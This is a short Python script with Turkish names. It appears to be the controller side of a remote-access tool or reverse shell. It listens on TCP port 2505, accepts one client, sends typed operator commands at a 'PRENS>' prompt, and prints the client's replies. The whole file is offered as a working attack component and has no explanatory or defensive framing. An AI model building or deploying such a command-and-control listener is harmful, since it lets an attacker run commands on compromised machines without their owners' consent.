import socket
import time
from colorama import Fore,Back,Style,init
init()

baglantı =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglantı.bind(("0.0.0.0",2505))
baglantı.listen(1)
print("sunucu dinleniyor")

client ,addr =baglantı.accept()
print(client,addr)
print("yardım için"+Fore.GREEN+" yardım "+Fore.RESET+"yazın")

while True:
  emir=  input(Fore.RED+"PRENS>")
  client.send(emir.encode("utf-8"))
  gelenveri=client.recv(1024).decode("utf-8")
  print(Fore.RESET+gelenveri)
